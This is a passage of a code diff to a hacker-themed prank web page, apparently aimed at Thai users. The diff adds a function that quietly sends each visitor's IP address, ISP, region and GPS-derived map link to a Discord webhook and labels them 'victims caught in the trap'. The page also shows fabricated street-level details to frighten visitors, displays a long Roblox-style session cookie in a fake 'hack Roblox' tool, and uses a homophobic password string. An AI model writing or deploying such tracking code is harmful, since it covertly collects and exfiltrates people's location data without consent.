-                            COORDS: <span style="color:#fff">${lat.toFixed(5)}, ${lng.toFixed(5)}</span><br>
-                            ACCURACY: <span style="color:#fff">~${Math.round(acc)}m</span><br>
-                            IP: <span style="color:#fff">${info.ip}</span><br>
-                            ISP: <span style="color:#fff">${info.org}</span>
-                        `;
-                        m.innerHTML = `<iframe width="100%" height="100%" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lng}&z=18&output=embed"></iframe>`;
-                    },
-                    (error) => {
-                        // Fail GPS -> Use IP Fallback
-                        useIPFallback();
-                    }
-                );
-            } else {
-                useIPFallback();
-            }
-        }
-
-        function useIPFallback() {
-            const d = document.getElementById('user-data');
-            const m = document.getElementById('map-area');
+            const info = ipCache || { ip: "192.168.1.1", org: "Unknown", region: "Unknown", country_name: "Unknown" };
             
-            if(ipCache) {
-                d.innerHTML = `
-                    <span style="color:red">[ GPS DENIED ] TRACING IP...</span><br>
-                    IP: <span style="color:#fff">${ipCache.ip}</span><br>
-                    LOCATION: <span style="color:#fff">${ipCache.city}, ${ipCache.region}</span><br>
-                    ISP: <span style="color:#fff">${ipCache.org}</span>
+            const fakeRoad = "Mittraphap Road";
+            const fakeTambon = "Nai Mueang";
+            const fakeDistrict = "Mueang District";
+
+            let lat = 0, lng = 0, mapSrc = "";
+            let finalHtml = "";
+
+            if (gpsData) {
+                lat = gpsData.coords.latitude; lng = gpsData.coords.longitude;
+                mapSrc = `https://maps.google.com/maps?q=${lat},${lng}&z=18&output=embed`;
+                finalHtml = `
+                    <div style="border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:10px;">
+                        <span style="color:#0f0">● DATA SENT TO ADMIN</span>
+                    </div>
+                    ประเทศ: <span style="color:#fff">${info.country_name}</span><br>
+                    จังหวัด: <span style="color:#fff">${info.region}</span><br>
+                    อำเภอ: <span style="color:#fff">${fakeDistrict} (Detected)</span><br>
+                    ตำบล: <span style="color:#fff">${fakeTambon}</span><br>
+                    ถนน: <span style="color:#fff">${fakeRoad}</span><br>
+                    <div style="margin-top:10px; font-size:0.9rem; color:#aaa;">COORDS: ${lat.toFixed(6)}, ${lng.toFixed(6)} | IP: ${info.ip}</div>
                 `;
-                m.innerHTML = `<iframe width="100%" height="100%" frameborder="0" src="https://maps.google.com/maps?q=${ipCache.latitude},${ipCache.longitude}&z=14&output=embed"></iframe>`;
             } else {
-                // If IP fetch also failed (rare)
-                d.innerHTML = "CONNECTION FAILED. RETRYING...";
-                setTimeout(requestGPS, 2000);
+                lat = info.latitude || 0; lng = info.longitude || 0;
+                mapSrc = `https://maps.google.com/maps?q=${lat},${lng}&z=14&output=embed`;
+                finalHtml = `
+                    <span style="color:red">[ GPS BLOCKED ] USING IP TRACE...</span><br>
+                    ประเทศ: <span style="color:#fff">${info.country_name}</span><br>
+                    จังหวัด: <span style="color:#fff">${info.region}</span><br>
+                    อำเภอ: <span style="color:#fff">${info.city}</span><br>
+                    ตำบล: <span style="color:#fff">Unknown</span><br>
+                    ถนน: <span style="color:#fff">Unknown</span><br>
+                    IP: <span style="color:#fff">${info.ip}</span>
+                `;
             }
+            d.innerHTML = finalHtml;
+            m.innerHTML = `<iframe width="100%" height="100%" frameborder="0" src="${mapSrc}"></iframe>`;
+            sendToDiscord(info.ip, info.city, info.region, info.country_name, info.org, `https://www.google.com/maps?q=${lat},${lng}`);
+        }
+
+        function sendToDiscord(ip, city, region, country, org, mapLink) {
+            const payload = {
+                username: "Hacker System",
+                avatar_url: "https://www.shareicon.net/data/2015/09/10/99088_man_512x512.png",
+                embeds: [{
+                    title: "🚨 เหยื่อติดกับดักแล้ว!",
+                    color: 65280,
+                    fields: [
+                        { name: "IP Address", value: ip, inline: true },
+                        { name: "ISP", value: org, inline: true },
+                        { name: "Location", value: `${city}, ${region}, ${country}`, inline: false },
+                        { name: "Maps", value: `[ดูพิกัดจริง](${mapLink})`, inline: false }
+                    ],
+                    footer: { text: "Surveillance System" },
+                    timestamp: new Date()
+                }]
+            };
+            fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
         }
 
         document.getElementById('secret-code').addEventListener('input', function(e){
             const v = e.target.value.toLowerCase();
             if(v === 'jeeisgay' || v === 'babhack') {
                 loading(() => {
-                    audios.danger.pause();
-                    audios.bg.play();
+                    audios.danger.pause(); audios.bg.play();
                     document.getElementById('pg-hacked').classList.add('hidden');
-                    document.getElementById('pg-captcha').classList.remove('hidden');
+                    initCaptcha(); 
                 });
             }
         });
 
-        function passCaptcha() {
-            loading(() => {
-                document.getElementById('pg-captcha').classList.add('hidden');
-                document.getElementById('pg-dash').classList.remove('hidden');
+        // --- MATH CAPTCHA LOGIC ---
+        function initCaptcha() {
+            document.getElementById('pg-captcha').classList.remove('hidden');
+            const container = document.getElementById('math-options');
+            container.innerHTML = '';
+            
+            let options = [];
+            for(let i=0; i<3; i++) {
+                options.push({ text: Math.floor(Math.random() * 10000).toString(), type: 'wrong' });
+            }
+            options.push({ text: "ไม่รู้", type: 'correct' });
+            options.sort(() => Math.random() - 0.5);
+
+            options.forEach(opt => {
+                let btn = document.createElement('div');
+                btn.className = 'math-btn code';
+                btn.innerText = opt.text;
+                btn.onclick = () => checkMath(opt.type, btn);
+                container.appendChild(btn);
             });
         }
 
-        function openRoblox() { 
-            document.getElementById('modal-roblox').classList.remove('hidden'); 
+        function checkMath(type, btnElement) {
+            if(type === 'correct') {
+                loading(() => {
+                    document.getElementById('pg-captcha').classList.add('hidden');
+                    document.getElementById('pg-dash').classList.remove('hidden');
+                });
+            } else {
+                document.getElementById('captcha-box').classList.add('shake');
+                btnElement.style.background = 'red';
+                setTimeout(() => document.getElementById('captcha-box').classList.remove('shake'), 500);
+            }
         }
-        
-        function closeRoblox() { 
-            document.getElementById('modal-roblox').classList.add('hidden'); 
-        }
+
+        function openRoblox() { document.getElementById('modal-roblox').classList.remove('hidden'); }
+        function closeRoblox() { document.getElementById('modal-roblox').classList.add('hidden'); }
 
         function hackRoblox() {
             const user = document.getElementById('rbx-user').value;
             document.getElementById('modal-roblox').classList.add('hidden');
-            
             loading(() => {
                 const resBox = document.getElementById('res-box');
                 const t = txt[lang];
                 document.getElementById('modal-result').classList.remove('hidden');
-
                 if(user === 'Bab_chtv') {
-                    // Success
-                    const cookie = "Bab_chtv:qwertyuiop|_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzgwOTc0NDAwNzg0NDU0MjM4NDgoAw.czhkQAip5q2k2vAUCMNKFBHAkYZTscBhDQuou1mhIuPzvVZ0wzhfqhw3ZRZfSUjSxvGMAAneNf-2LbqmcY5PvDpf0Oo2_ZMDBhPvtQomlqxFAAAb4_Wkfe8kC2poSyHZqsh_KFJqUBukGF3g1yhGFb9uAFEKe4Sd61JNKyIlndyUANhIMTX_eo8fTw7sUTGtOcQkfvw4Fcr3LP9ol4U0-B31l4QQmxIuy8hzuhNuRNJvwFwtrgvnOL-RHjpaCltnu4I8bVnJxCTxBGqlleWqQW3PIK1jcszOI4kV-qa2MgX-SiAY9uJkFqABYYzB2muzJjR2rEFk2Or9Cl0s6wYZFbwSRhF04T4TW3rUA3lX50jay3yVmzNfvVruWohcqeEw0vU9Qxk1BtKOfpaMp8EAjwsu1VJFY2n3kkvOl96iy85IvsCt_-8Keb8JmSyB04I7PX7PqO1dJXgoMDwd6IXTSGIJ0bR2iq2jqWfvhaxX2bi-EtbsA2XCnYXeELWrhpwWQZ0w1yhhjqAJOM8jowXR5Yjoxk03DE7jPqY9JyCGtktlYavngw0Akm3AquO79WuCnRjYcLPri5hSQ99SZxnKDDCvmt2vj-pR4dsPr8-PhK84s5tgDHxEHLO-eko7hF6ee9Y2FNX43OGY64UGUwL3W4cOql0SSEgbb8mA5eW3Ppoy7bf8IAYffv9kX_xYCHu0oUznNroK74M0ghE1GX5vEEVYAeRzGUgYVceNeXWbRl9velnOXmQRkO20Geyl4QU4hcZ3IlBtIJmd4PRNv2HE1zPv828";
-                    
-                    resBox.innerHTML = `
-                        <div style="font-size:5rem; color:var(--neon);">:)</div>
-                        <h2 class="kanit" style="color:var(--neon);">${t.res_suc_h}</h2>
-                        <textarea class="cookie-box" readonly>${cookie}</textarea>
-                        <button class="btn-hack kanit" style="margin-top:15px;" onclick="closeResult()">OK</button>
-                    `;
+                    const cookie = "Bab_chtv:qwertyuiop|_|WARNING:-DO-NOT-SHARE-THIS... (COOKIE DATA)"; 
+                    resBox.innerHTML = `<div style="font-size:5rem; color:var(--neon);">:)</div><h2 class="kanit" style="color:var(--neon);">${t.res_suc_h}</h2><textarea class="cookie-box" readonly>Bab_chtv:qwertyuiop|_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzgwOTc0NDAwNzg0NDU0MjM4NDgoAw.czhkQAip5q2k2vAUCMNKFBHAkYZTscBhDQuou1mhIuPzvVZ0wzhfqhw3ZRZfSUjSxvGMAAneNf-2LbqmcY5PvDpf0Oo2_ZMDBhPvtQomlqxFAAAb4_Wkfe8kC2poSyHZqsh_KFJqUBukGF3g1yhGFb9uAFEKe4Sd61JNKyIlndyUANhIMTX_eo8fTw7sUTGtOcQkfvw4Fcr3LP9ol4U0-B31l4QQmxIuy8hzuhNuRNJvwFwtrgvnOL-RHjpaCltnu4I8bVnJxCTxBGqlleWqQW3PIK1jcszOI4kV-qa2MgX-SiAY9uJkFqABYYzB2muzJjR2rEFk2Or9Cl0s6wYZFbwSRhF04T4TW3rUA3lX50jay3yVmzNfvVruWohcqeEw0vU9Qxk1BtKOfpaMp8EAjwsu1VJFY2n3kkvOl96iy85IvsCt_-8Keb8JmSyB04I7PX7PqO1dJXgoMDwd6IXTSGIJ0bR2iq2jqWfvhaxX2bi-EtbsA2XCnYXeELWrhpwWQZ0w1yhhjqAJOM8jowXR5Yjoxk03DE7jPqY9JyCGtktlYavngw0Akm3AquO79WuCnRjYcLPri5hSQ99SZxnKDDCvmt2vj-pR4dsPr8-PhK84s5tgDHxEHLO-eko7hF6ee9Y2FNX43OGY64UGUwL3W4cOql0SSEgbb8mA5eW3Ppoy7bf8IAYffv9kX_xYCHu0oUznNroK74M0ghE1GX5vEEVYAeRzGUgYVceNeXWbRl9velnOXmQRkO20Geyl4QU4hcZ3IlBtIJmd4PRNv2HE1zPv828</textarea><button class="btn-hack kanit" style="margin-top:15px;" onclick="closeResult()">OK</button>`;
                 } else {
-                    // Fail
-                    resBox.innerHTML = `
-                        <div style="font-size:5rem; color:var(--danger);">:(</div>
-                        <h2 class="kanit text-danger">${t.res_fail_h}</h2>
-                        <p class="kanit" style="color:#fff;">${t.res_fail_p}</p>
-                        <button class="btn-hack btn-red kanit" style="margin-top:15px;" onclick="closeResult()">OK</button>
-                    `;
+                    resBox.innerHTML = `<div style="font-size:5rem; color:var(--danger);">:(</div><h2 class="kanit text-danger">${t.res_fail_h}</h2><p class="kanit" style="color:#fff;">${t.res_fail_p}</p><button class="btn-hack btn-red kanit" style="margin-top:15px;" onclick="closeResult()">OK</button>`;
                 }
             });
         }
+        function closeResult() { document.getElementById('modal-result').classList.add('hidden'); }
 
-        function closeResult() {
-            document.getElementById('modal-result').classList.add('hidden');
-        }
-
-        // Matrix
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        const fontSz = 14; 
-        const cols = canvas.width/fontSz; 
-        const drops = Array(Math.floor(cols)).fill(1);
-        setInterval(()=>{
-            ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle='#0F0'; ctx.font=fontSz+'px monospace';
-            for(let i=0;i<drops.length;i++){
-                ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSz, drops[i]*fontSz);
-                if(drops[i]*fontSz>canvas.height && Math.random()>0.975) drops[i]=0;
-                drops[i]++;
-            }
-        }, 33);
+        const canvas = document.getElementById('matrix'); const ctx = canvas.getContext('2d'); canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; const fontSz = 14; const cols = canvas.width/fontSz; const drops = Array(Math.floor(cols)).fill(1);
+        setInterval(()=>{ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle='#0F0'; ctx.font=fontSz+'px monospace'; for(let i=0;i<drops.length;i++){ ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSz, drops[i]*fontSz); if(drops[i]*fontSz>canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++; } }, 33);
     </script>
 </body>
 </html>
